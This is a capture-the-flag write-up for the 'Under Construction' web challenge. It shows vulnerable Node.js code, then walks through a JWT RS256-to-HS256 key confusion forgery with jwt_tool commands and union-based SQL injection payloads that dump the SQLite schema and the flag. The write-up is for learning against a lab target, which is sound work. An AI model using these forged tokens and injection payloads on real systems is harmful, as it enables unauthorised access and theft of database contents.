# Under Construction Writeup

Downloading the source code and digging around reveals the following code in `helpers/JWTHelper.js`:

```js
module.exports = {
    async sign(data) {
        data = Object.assign(data, {pk:publicKey});
        return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
    },
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
}
```

Both the "RS256" and "HS256" algorithms are allowed for decryption. This is CVE-2016-5431/CVE-2016-10555.

See my ["Cyber Santa is Coming to Town" CTF 2021 writeup for the Naughty or Nice challenge](https://github.com/HHousen/HTB-CyberSanta-2021/blob/master/Web/Naughty%20or%20Nice/README.md), which details this exact exploit. This part of this guide is largely the same as the first part of the "Naughty or Nice" writeup.

The HS256 algorithm is symmetric, which means it uses the sane secret key to sign and verify each message. The RS256 algorithm is asymmetric, which means it uses a private key to sign the message and a public key for verification. However, if we change the algorithm from RS256 to HS256, the backend code will use the public key as the symmetric secret key. In other words, the HS256 algorithm will be used to verify the signature with the public key as the HS256 secret key. We know the public key so we can, in theory, easily modify the JWT and sign it.

However, before we can do this we need to get the JWT token and get the public key. So, make an account on the website, open up your browser's cookie page in the developer tools, and copy the `session` cookie. We can use [JWT.io](https://jwt.io/) or [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) to decode the cookie.

`python jwt_tool.py "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2NDQ5ODM2MzJ9.E3BfhVQHAM5l9ty1lqu8mYI9GqgaVtTsTtDSaezxXQuCRhBBoiz4KVFNEAxaS7gfnJegVgFSHFgF1UBDFaS6ucVrkUHAz6ERlLZtAx8z1D_pSTsg-f4Euxldj03yq4UBMcH399iIcADUjOXbLhO6Qnw9U309aOW2_NmZDOGZjhYhZewEfHH1kCqHFuaaZisKroV1TUoa-DONxxADlseuGbgXBg081ICspqA7Bw9mvZSNM1P8DplmvPh71UldWU3k2G4t-g3t2SaE07T1l74jlvfJPByXcI52gcgqQtL9zKaicSV0mk0fNcLPmfZqXp30qX0UBf3bd4vhiYfgFY44jg"`:

```
=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] typ = "JWT"

Token payload values:
[+] username = "test"
[+] pk = "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----
"
[+] iat = 1644983632    ==> TIMESTAMP = 2022-02-15 22:53:52 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

Fortunately for us, the public key is encoded in the JWT. Let's save that to a file called `pub.key`.

There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. Anyway, we will use [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) in this guide.

We still need to figure out how to get the flag though. Looking at `helpers/DBHelper.js` we see that the `getUser` function is vulnerable to SQL injection:

```js
getUser(username){
    return new Promise((res, rej) => {
        db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
            if (err) return rej(err);
            res(data);
        });
    });
}
```

We can directly control what goes in `${username}`.

So, in `routes/index.js` we see that when someone accesses the main page, we call the `DBHelper.getUser` with the user's `username`, which we control. (The actual decoding of the JWT and getting the username is handled by `middleware/AuthMiddleware.js`.)

```js
router.get('/', AuthMiddleware, async (req, res, next) => {
    try{
        let user = await DBHelper.getUser(req.data.username);
        if (user === undefined) {
            return res.send(`user ${req.data.username} doesn't exist in our database.`);
        }
        return res.render('index.html', { user });
    }catch (err){
        return next(err);
    }
});
```

Thus, we can perform a SQL injection by changing the username field of the JWT.

Let's use `jwt_tool` to perform the JWT confusion exploit the JWT we got from the website: `python jwt_tool.py [[JWT]] -I -pc username -pv hacked -X k -pk pub.key`. This syntax means the following (read more by running `python jwt_tool.py --help`):

* `-I`: Inject new claims (or in our case update the `username` claim).
* `-pc`: The claim to tamper with.
* `-pv`: The new value to inject into the tampered claim.
* `-X`: Exploit and `k` stands for the key confusion exploit.
* `-pk`: The public key to use for signing the token with the key confusion exploit specified by `-X`.

Putting the new JWT into the website (through the developer tools) produces the erorr message "user hacked doesn't exist in our database," which is exactly what was expected because of the line ``return res.send(`user ${req.data.username} doesn't exist in our database.`);`` in the `router.get('/')` function.

Now we need to figure out what value to put in the `username` value in the JWT so that we can read the database. We are going to want to use a "union select" sql injection since our SQL statement starts with `SELECT * FROM users WHERE username = '[WE CONTROL THIS]'`.

At this point, I ran the command `python jwt_tool.py [[JWT]] -I -pc username -pv [[SQLi Payload]] -X k -pk pub.key` over and over again to generate JWTs with different potential payloads and see what worked. [PortSwigger has a great guide](https://portswigger.net/web-security/sql-injection/union-attacks) on union based SQLi, which I highly recommend reading if you haven't done this type of attack before.

We first determine the number of columns with `' ORDER BY 3--`, which returns `user ' ORDER BY 3-- doesn't exist in our database.`. Next we try `' ORDER BY 4--`, which produces `Error: SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 3`. So, we have 3 columns.

The next step is to determine the data types of those colums so we can find one containing a string: `' UNION SELECT 'a',NULL,NULL--`. With this query the page loads normally but nothing is displayed after "Welcome." Trying the second column with `' UNION SELECT NULL,'a',NULL--` causes the page to load normally and an "a" is displayed after "Welcome." Therefore, we want to select things into the second column.

Next, we look at the "SQLite Injection" page from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#string-based---extract-database-structure) and try to use the `' UNION SELECT sql FROM sqlite_schema--` syntax to extract the database structure. However, this just outputs `Error: SQLITE_ERROR: no such table: sqlite_schema`. A quick online search finds that `sqlite_schema` was renamed to `sqlite_master`. Also, we need to use the correct number of columns and make use of `group_concat`, which returns a string with concatenated non-NULL value from a group (in this case `sql`). So, our injected payload is `' UNION SELECT NULL,(SELECT group_concat(sql) FROM sqlite_master),NULL--`, which produces the following output:

```
CREATE TABLE "flag_storage" ( "id" INTEGER PRIMARY KEY AUTOINCREMENT, "top_secret_flaag" TEXT ),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE "users" ( "id" INTEGER, "username" VARCHAR(255) NOT NULL, "password" VARCHAR(255) NOT NULL, PRIMARY KEY("id") )
```

We see that there is a table called `flag_storage` with a column called `top_secret_flaag`. Let's update our last injected payload to select this flag from the `flag_storage` table: `' UNION SELECT NULL,(SELECT top_secret_flaag from flag_storage),NULL--`. Running this query displays the flag.

`HTB{d0n7_3xp053_y0ur_publ1ck3y}`
